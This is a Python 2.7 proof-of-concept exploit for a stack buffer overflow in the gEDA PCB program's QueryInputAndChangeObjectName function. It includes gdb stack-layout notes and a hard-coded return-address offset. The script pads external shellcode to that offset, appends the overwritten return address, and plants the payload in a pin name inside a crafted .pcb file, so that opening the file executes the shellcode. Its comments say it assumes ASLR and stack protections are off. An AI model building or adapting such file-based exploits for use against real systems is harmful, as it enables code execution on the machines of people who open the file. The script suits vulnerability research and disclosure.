#!/usr/bin/env python2.7

import struct
import sys

#build proof of concept stack overflow exploit for gEDA PCB software 
#(currently proof of concept with FORTIFY_SOURCE disable, stack protection disable, ASLR disable)

#this is a buffer > stack based overflow executed in change.c:2458, function QueryInputAndChangeObjectName

#stack layout: (this addresses will change but offsets will not)
# Thread 1 "pcb" hit Breakpoint 2, QueryInputAndChangeObjectName (Type=256, 
#     Ptr1=0x838c290, Ptr2=0x838d008, Ptr3=0x838d008) at change.c:2459
# 2459	{
# (gdb) info frame
# Stack level 0, frame at 0xbfffe6a0:
#  eip = 0x8084170 in QueryInputAndChangeObjectName (change.c:2459); 
#     saved eip = 0x806799c
#  called by frame at 0xbfffe6d0
#  source language c.
#  Arglist at unknown address.
#  Locals at unknown address, Previous frame's sp is 0xbfffe6a0
#  Saved registers:
#   eip at 0xbfffe69c
# (gdb) print &msg
# $1 = (char (*)[513]) 0xbfffe47f
#(gdb) print exit
#$4 = {<text variable, no debug info>} 0xb712a9d0 <__GI_exit>



buffer_base_addr = 0xbfffe47f
buffer_to_rip_offset = 541
#buffer_to_rip_offset = 650


def build_exploit_file(exploit):
	#open .pcb file to add payload to
	payload_file = open('LED.pcb', 'r')
	file_contents = payload_file.readlines()
	payload_file.close()
	#hard coded line chosen 
	file_contents[1363] = "Pin(0 -300 60 30 90 28 \"GND\" \"" + exploit + "\" 0x00000001)\n"
	#write back to file 
	with open('bad_led.pcb', 'w') as file:
		file.writelines( file_contents )

def build_exploit(shellcode):
	len_shellcode = len(shellcode)
	base_address = struct.pack('<L', buffer_base_addr)
	exploit_string = shellcode+'a'*(buffer_to_rip_offset-len_shellcode)+base_address
	return exploit_string 

#load shellcode 
if len(sys.argv) == 2:
	buffer_base_addr = int(sys.argv[1], 0)
print "buffer base address: "
print hex(buffer_base_addr)[:-1]
print '\n'
shellcode = open("shellcode.bin", 'rb').read()
exploit = build_exploit(shellcode)
#print exploit 
build_exploit_file(exploit)







